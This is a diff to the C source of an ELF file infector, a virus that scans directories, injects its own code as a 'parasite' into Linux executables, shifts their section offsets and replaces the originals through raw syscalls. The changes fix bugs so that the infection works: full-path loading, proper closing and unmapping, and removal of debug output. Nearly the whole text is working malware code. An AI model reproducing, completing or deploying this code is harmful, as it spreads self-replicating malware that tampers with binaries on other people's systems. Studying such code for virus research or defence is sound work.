@@ -45,11 +45,16 @@ int _fstat(long, void *);
 long _lseek(long, long, unsigned int);
 void Exit(long);
 void *_mmap(void *, unsigned long, unsigned long, unsigned long,  long, unsigned long);
+int _munmap(void *, size_t);
 long _open(const char *, unsigned long, long);
 long _write(long, char *, unsigned long);
 int _read(long, char *, unsigned long);
 int _getdents64(unsigned int fd, struct linux_dirent64 *dirp,
                     unsigned int count);
+int _rename(const char *, const char *);
+int _close(unsigned int);
+
+/* Customs */
 unsigned long get_rip(void);
 void end_code(void);
 void dummy_marker(void);
@@ -94,6 +99,7 @@ typedef struct elfbin {
 	size_t size;
 	char *path;
 	struct stat st;
+	int fd;
 } elfbin_t;
 
 #define DIR_COUNT 3
@@ -240,7 +246,7 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
          */ 
         extern int return_entry_start;
 
-        if ((ofd = _open(TMP, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode)) == -1) 
+        if ((ofd = _open(TMP, O_CREAT|O_WRONLY|O_TRUNC, st.st_mode)) == -1) 
                 return -1;
         
         /*
@@ -254,10 +260,7 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
          * Now inject the virus
          * [ehdr][virus]
          */
-	for (i = 0; i < 32; i++)
-		_printf("%x ", self->mem[i] & 0xff);
         if ((c = _write(ofd, parasite, self->size)) != self->size) {
-		DEBUG_PRINT("Wrote %d bytes (not %d)\n", c, self->size);
 		return -1;
 	}
 
@@ -265,7 +268,6 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
          * Seek to end of tracer.o + PAGE boundary  
          * [ehdr][virus][pad]
          */
-	DEBUG_PRINT("Writing phdr's, text, data\n");
         uint32_t offset = sizeof(ElfW(Ehdr)) + paddingSize;
         if ((c = _lseek(ofd, offset, SEEK_SET)) != offset) 
 		return -1;
@@ -279,15 +281,19 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
         unsigned int final_length = st.st_size - (sizeof(ElfW(Ehdr))); // + target->ehdr->e_shnum * sizeof(Elf64_Shdr));
         if ((c = _write(ofd, mem, final_length)) != final_length) 
 		return -1;
-        
-		
+        _fsync(ofd);
+	if (_close(ofd) < 0)
+		_printf("close failed\n");
 	_printf("Renaming %s to %s\n", TMP, target->path);
-        if (_rename(TMP, target->path) < 0)
+ 	if (_close(target->fd) < 0)
+		_printf("close failed\n");
+       	if (_munmap(target->mem, target->size) < 0)
+		_printf("munmap failed\n");
+	
+	if (_rename(TMP, target->path) < 0)
 		DEBUG_PRINT("rename failed\n");
         
-	_close(ofd);
-
-
+	return 0;
 }
 
 int infect_elf_file(elfbin_t *self, elfbin_t *target)
@@ -308,8 +314,11 @@ int infect_elf_file(elfbin_t *self, elfbin_t *target)
 	 * Get size of parasite (self)
 	 */
         parasiteSize = self->size;
+	
 	DEBUG_PRINT("parasiteSize: %d\n", parasiteSize);
+	
 	paddingSize = PAGE_ALIGN_UP(parasiteSize + JMPCODE_LEN);
+	
 	DEBUG_PRINT("paddingSize: %d\n", paddingSize);
 	
 	
@@ -343,6 +352,7 @@ int infect_elf_file(elfbin_t *self, elfbin_t *target)
 	shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];
 	char *StringTable = &mem[shdr[ehdr->e_shstrndx].sh_offset];
 	for (i = 0; i < ehdr->e_shnum; i++) {
+#if DEBUG
                 if (!_strncmp((char *)&StringTable[shdr[i].sh_name], ".text", 5)) {
                         shdr[i].sh_offset = sizeof(ElfW(Ehdr)); // -= (uint32_t)paddingSize;
 			shdr[i].sh_addr = origText - paddingSize;
@@ -350,6 +360,7 @@ int infect_elf_file(elfbin_t *self, elfbin_t *target)
                         shdr[i].sh_size += self->size;
                 }  
                 else 
+#endif
 		shdr[i].sh_offset += paddingSize;
 
 	}
@@ -388,6 +399,7 @@ int load_target(const char *path, elfbin_t *elf)
 	int fd = _open(path, O_RDONLY, 0);
 	if (fd < 0)
 		return -1;
+	elf->fd = fd;
 	if (_fstat(fd, &st) < 0)
 		return -1;
 	elf->mem = _mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
@@ -460,7 +472,7 @@ void do_main(struct bootstrap_data *bootstrap)
 	
 	struct linux_dirent64 *d;
 	int bpos, fcount, dd, nread;
-	char *dir = NULL, **files, dbuf[1024];
+	char *dir = NULL, **files, *fpath, dbuf[1024];
 	struct stat st;
 	mode_t mode;
 	uint32_t rnum;
@@ -508,11 +520,11 @@ void do_main(struct bootstrap_data *bootstrap)
 			//	continue;
 			if (d->d_name[0] == '.')
 				continue;
-			if (check_criteria(full_path(d->d_name, dir)) < 0)
+			if (check_criteria(fpath = full_path(d->d_name, dir)) < 0)
 				continue;
 			//DEBUG_PRINT("infecting file: %s\n", d->d_name);
 			
-			load_target(d->d_name, &target);
+			load_target(fpath, &target);
 			infect_elf_file(&self, &target);
 		}
 		
@@ -596,6 +608,18 @@ int _fstat(long fd, void *buf)
         asm("mov %%rax, %0" : "=r"(ret));
         return (int)ret;
 }
+
+int _unlink(const char *path)
+{
+	   long ret;
+        __asm__ volatile(
+                        "mov %0, %%rdi\n"
+			"mov $87, %%rax\n"		
+			"syscall" ::"g"(path));
+	asm("mov %%rax, %0" : "=r"(ret));
+        return (int)ret;
+}
+
 int _rename(const char *old, const char *new)
 {
         long ret;
